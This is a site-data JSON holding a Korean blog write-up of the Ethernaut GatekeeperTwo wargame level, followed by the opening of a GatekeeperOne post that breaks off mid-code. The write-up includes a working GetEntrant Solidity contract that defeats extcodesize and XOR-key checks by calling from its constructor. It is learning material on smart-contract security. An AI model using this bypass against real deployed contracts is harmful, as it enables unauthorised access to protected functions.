{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/ethernaut/14_gatekeeperTwo_ethernaut/14_gatekeeperTwo_ethernaut/",
    "result": {"data":{"cur":{"id":"7887cac8-6f3c-5895-b5ff-92524903be97","html":"<h1 id=\"-privacy\" style=\"position:relative;\"><a href=\"#-privacy\" aria-label=\" privacy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Privacy</h1>\n<p><strong>Difficulty 6/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>Gatekeeper을 지나 entrant로 등록하기</li>\n<li>GatekeeperOne과 같다.</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!\n더 자세한 설명은 코드 뒤에 나온다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperTwo</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// GatekeeperOne와 똑같은 gateOne</span>\n    <span class=\"token comment\">// tx.origin과 msg.sender가 다르게하라!</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// gateTwo</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint</span> x<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// extcodessize(caller())를 x에 저장</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">{</span> x <span class=\"token operator\">:=</span> <span class=\"token function\">extcodesize</span><span class=\"token punctuation\">(</span><span class=\"token function\">caller</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// x가 0과 같으면 진행</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>x <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// A xor B == C 이게 하라! (^ = XOR)</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// modifier를 다 통과하면 tx.origin이 entrant가 될 수 있다!</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 목표는 etrant 를 얻는 것이다.</p>\n<p>시작하기 전 Ethernaut에서 주는 힌트를 보고가자</p>\n<ul>\n<li>첫번째 gate는 gatekeeperOne과 같다. gatekeeperOne의 gateOne을 기억해보자</li>\n<li><code class=\"language-text\">assembly</code> 키워드는 Solidity의 vanilla Solidity에 있지않은 기능등에 접근할 수 있게 해준다. <code class=\"language-text\">extcodesize</code>는 주어진 주소의 contract의 크기를 가져온다. 이더리움 Yellow Paper 7번 섹션에서 더 자세히 배울 수 있다.</li>\n<li><code class=\"language-text\">^</code>는 bitwise operation이며 XOR을 뜻한다. Coin Flip을 참조하며 이번 레벨을 시작해도 좋을 것이다.</li>\n</ul>\n<p>우리는 entrant를 얻기 위해 3개의 modifier의 require문을 모두 만족시켜야 한다.</p>\n<p>첫번째로 gateOne은 msg.sender와 tx.origin을 다르게 만들면 통과할 수 있다. 이는 다른 contract를 만들어 call하면 통과할 수 있다. gateOne은 <a href=\"https://holyhansss.github.io/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_1_ethernaut/\">지난 문제</a>에서 풀었고, <a href=\"https://holyhansss.github.io/ethernaut/4_telephone_ethernaut/4_telephone_ethernaut/\">Telephone</a>문제에도 나와있음으로 풀 수 있을 것이라고 생각하고 gateTwo로 넘어가도록 하겠다.</p>\n<p>두번째로 gateTwo는 <code class=\"language-text\">assembly</code>와 <code class=\"language-text\">extcodesize</code>에 대해서 이해해야한다.</p>\n<p>우선 <code class=\"language-text\">assembly</code>는 low level 연산을 수행 할 수 있도록 도와준다. 또한 힌트에서 알 수 있듯이 vanilla Solidity에 있지 않은 기능에 접근할 수 있게 해준다.  <code class=\"language-text\">assembly</code>는 Uniswap V2 contract에서도 본적있다. 그렇기 때문에 contract를 분석하기 위해서는 <code class=\"language-text\">assembly</code>에 대해 아는 것이 필수이다.</p>\n<p>그렇다면 <code class=\"language-text\">extcodesize</code>는 무엇일까?\n<code class=\"language-text\">extcodesize</code>는  주어진 주소의 contract의 크기를 반환한다. 그렇다면 우리가 entrant를 얻기위해 만드는 contract는 크기가 0이 될 수 있나??</p>\n<p>있다! <code class=\"language-text\">extcodesize</code>는 contract initialization 단계에서는 0을 반환한다. contract creation이 완료되어야 코드가 저장되기 때문이다.\n즉 constructor안에 코드를 넣는다면 extcodesize는 0을 반환 할 것이고 gateTwo를 통과할 수 있게된다.</p>\n<p><a href=\"https://ethereum.github.io/yellowpaper/paper.pdf\">ethereum yellow paper</a>는 이더리움의 기술 백서이다. 기술 백서의 7번(CONTRACT CREATION) section을 보면 extcodesize에 대한 자세히 알 수 있다고 한다. 나는 읽어보고 더 확실한 이해를 위해 구글에 검색했다!</p>\n<br/>\n마지막으로 gateThree다. gateThree를 통과하기 위해서는 비트 연산자에 대한 개념이 필요하다. 다행히 나는 학교수업에서 배운 적 있어 이해하는데, 큰 어려움은 없었다.\n<p>비트연산자에 대해서 먼저 설명해보겠다.</p>\n<ul>\n<li><code class=\"language-text\">&amp;</code>: and; <code class=\"language-text\">1010 &amp; 1111 == 1010</code></li>\n<li><code class=\"language-text\">|</code>: or; <code class=\"language-text\">1010 | 1111 == 1111</code></li>\n<li><code class=\"language-text\">^</code>: xor; <code class=\"language-text\">1010 ^ 1111 == 0101</code></li>\n<li><code class=\"language-text\">~</code>: not; <code class=\"language-text\">~1010 == 0101</code></li>\n</ul>\n<p>위 표는 <a href=\"https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd\">이 게시물</a>을 참조했다.</p>\n<p>XOR의 특성을 생각해보면 <code class=\"language-text\">A xor B = C</code> == <code class=\"language-text\">A xor C = B</code>라는 것을 알 수 있다. 우리는 우리의 _gateKey 계산을 위해 gatekeeperTwo contract의 gateThree의 require문 안에있는 수식가져와 위 xor의 특성처럼 대입할 수 있다. require문 안에는 다음과 같은 수식이 들어있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span></code></pre></div>\n<p>이를 xor의 특성을 적용해 바꾼다면 다음과 같아진다. 그럼 우린 이 코드를 넣어 _gateKey값을 구해 call을 보내면 된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span></code></pre></div>\n<p>getEtrant contract 코드를 함께 보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GetEntrant</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// gateTwo를 통과하기 위해 call을 constructor안에서 실행시켰다.</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _gatekeeperTwo<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// gateThree에 필요한 _gateKey를 위해 A^B=C를 A^C=B로 바꾸었다.</span>\n        <span class=\"token comment\">// 바꿀때 key는 bytes8임으로 bytes8을 type conversion을 해주었다.</span>\n        <span class=\"token builtin\">bytes8</span> _key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// _key를 사용해 call을 보낸다. </span>\n        _gatekeeperTwo<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">'enter(bytes8)'</span><span class=\"token punctuation\">,</span>_key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<p>gatekeeperTwo contract의 주소를 넣어 GetEntrant를 deploy시키면 완료된다!</p>\n<p>이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>GateKeeperOne과 마찬가지로 새로운 개념을 많이 배울 수 있는 문제 같았다. 문제를 그냥 푼다기 보다는 문제를 풀며 내가 어떤 것을 배우는지, 그리고 정확하게 이해하며 배우는 것에 집중해야할 것 같다. <code class=\"language-text\">assembly</code> 같은 경우 다른 contract에서도 사용하는 것을 봤고, 이해가 안됐었다. 하지만 문제를 풀며 직접 찾아보고 이해하려고 했을때는 더 잘 이해가 된 것 같다ㅎㅎ 앞으로도 열심히 하자:)</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>참고 자료: <a href=\"https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd\">https://medium.com/coinmonks/ethernaut-lvl-14-gatekeeper-2-walkthrough-how-contracts-initialize-and-how-to-do-bitwise-ddac8ad4f0fd</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></li>\n<li><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></li>\n<li><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></li>\n<li><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></li>\n<li><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></li>\n</ul>\n</div>","excerpt":"👋 Privacy Difficulty 6/10 승리 조건 코드 분석 풀이 순서로 진행 될 것이다. 승리 조건 Gatekeeper을 지나 entrant로 등록하기 GatekeeperOne과 같다. 코드 분석 분석은 주석에!\n더 자세한 설명은 코드 뒤에 나온다. 풀이 이 문제에서 우리의 목표는 etrant 를 얻는 것이다. 시작하기 전 Ethernaut에서 주는 힌트를 보고가자 첫번째 gate는 gatekeeperOne과 같다. gatekeeperOne의 gateOne을 기억해보자  키워드는 Solidity의 vanilla Solidity에 있지않은 기능등에 접근할 수 있게 해준다. 는 주어진 주소의 contract의 크기를 가져온다. 이더리움 Yellow Paper 7번 섹션에서 더 자세히 배울 수 있다. 는 bitwise operation이며 XOR을 뜻한다. Coin Flip을 참조하며 이번 레벨을 시작해도 좋을 것이다. 우리는 entrant를 얻기 위해 3개의 modifier의…","frontmatter":{"date":"January 21, 2022","title":"(Ethernaut 취약점 14) GatekeeperTwo","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/14_gatekeeperTwo_ethernaut/14_gatekeeperTwo_ethernaut/"}},"next":{"id":"4f09766e-9e42-5126-8e58-6a96ae2a0bdb","html":"<h1 id=\"-gatekeeper-one\" style=\"position:relative;\"><a href=\"#-gatekeeper-one\" aria-label=\" gatekeeper one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Gatekeeper One</h1>\n<p><strong>Difficulty 5/10</strong></p>\n<p><a href=\"https://holyhansss.github.io/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_1_ethernaut/\">GatekeeperOne - 1</a>에서 이어지는 글이다 !</p>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>GatekeeperOne contract에서스 3개의 gate가 존재한다. gate는 모두 modifier로 되어있다. 즉 3개의 modifier의 조건을 만족시키면 된다.<br>\n분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperOne</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// msg.sender과 tx.origin이 다르면 진행</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// gasleft()의 8191의 배수이면 진행</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token number\">8191</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// _gateKey가 type casting관련 3가지 조건에 만족하면 진행</span>\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// modifier를 포함한 함수: 이 함수를 통해 내가 entrant가 될 수 있다.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token 